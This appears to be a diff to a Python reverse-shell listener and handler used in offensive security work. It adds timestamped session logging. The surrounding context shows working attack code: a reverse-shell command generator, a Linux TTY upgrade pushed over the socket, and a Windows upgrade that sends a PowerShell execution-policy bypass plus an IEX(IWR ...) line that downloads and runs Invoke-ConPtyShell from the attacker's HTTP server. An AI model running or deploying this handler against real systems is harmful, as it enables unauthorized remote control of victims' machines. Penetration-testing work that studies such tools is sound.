@@ -13,6 +13,7 @@ import tty
 import termios
 import base64
 import urllib.parse
+from datetime import datetime
 
 SIOCGIFADDR = 0x8915
 
@@ -44,12 +45,38 @@ def create_reverse_shell(ip, port, os, encode, http_server_port, auto_upgrade):
         reverse_shell_cmd = urllib.parse.quote(reverse_shell_cmd)
     print(f"Reverse shell command:\n{reverse_shell_cmd}")
 
-def linux_shell(conn, exit_the_whole_thing):
+class ConnectionLogger:
+    """
+    Context manager for logging connection data with timestamps at the beginning of each newline.
+    """
+    def __init__(self, connected_ip):
+        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+        self.logfile_name = f"{connected_ip}-{timestamp}.txt"
+        self.logfile = open(self.logfile_name, 'w', encoding='utf-8')
+        print(f"Logging to {self.logfile_name}")
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        self.logfile.close()
+        return False
+
+    def log(self, data):
+        """
+        Write received data to logfile with timestamps at the beginning of each newline.
+        """
+        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
+        timestamped = data.replace('\n', '\n' + timestamp)
+        self.logfile.write(timestamped)
+        self.logfile.flush()
+
+def linux_shell(conn, exit_the_whole_thing, logger):
     # Full TTY plz 😌
     conn.sendall("stty raw -echo < /dev/tty; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || true \n export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116;\n".encode())
-    shell(conn, exit_the_whole_thing)
+    shell(conn, exit_the_whole_thing, logger)
 
-def shell(conn, exit_the_whole_thing):
+def shell(conn, exit_the_whole_thing, logger):
     while True:
         # Create queues for thread communication
         command_queue = queue.Queue()
@@ -61,8 +88,11 @@ def shell(conn, exit_the_whole_thing):
                     if not data:
                         exit_event.set()
                         break
-                    decoded = data.decode().replace('\n', '\r\n')
-                    print(decoded, end='', flush=True)
+                    decoded = data.decode()
+                    # Display with \r\n replacement for terminal
+                    print(decoded.replace('\n', '\r\n'), end='', flush=True)
+                    # Write to logfile with timestamps at beginning of each newline
+                    logger.log(decoded)
                 except:
                     exit_event.set()
                     break
@@ -104,11 +134,11 @@ def shell(conn, exit_the_whole_thing):
             sys.exit(0)
         receive_thread.join()
 
-def windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port):
+def windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port, logger):
     if auto_upgrade:
         conn.sendall("powershell -ep Bypass\n".encode())
         conn.sendall(f"IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell -Upgrade -Rows 38 -Cols 116\n".encode())
-    shell(conn, exit_the_whole_thing)
+    shell(conn, exit_the_whole_thing, logger)
 
 def start_http_server(port):
       # Start a simple HTTP server to serve PowerShell Empire files
@@ -134,10 +164,11 @@ def listen_for_connection(port, os, http_server_port, ip, auto_upgrade):
                     conn.settimeout(1.0)
                     print(f"Connected by {addr}")
 
-                    if os == 'linux':
-                        linux_shell(conn, exit_the_whole_thing)
-                    elif os == 'windows':
-                        windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port)
+                    with ConnectionLogger(addr[0]) as logger:
+                        if os == 'linux':
+                            linux_shell(conn, exit_the_whole_thing, logger)
+                        elif os == 'windows':
+                            windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port, logger)
 
             except KeyboardInterrupt:
                 print("Fuck, lost connection, reconnecting...")
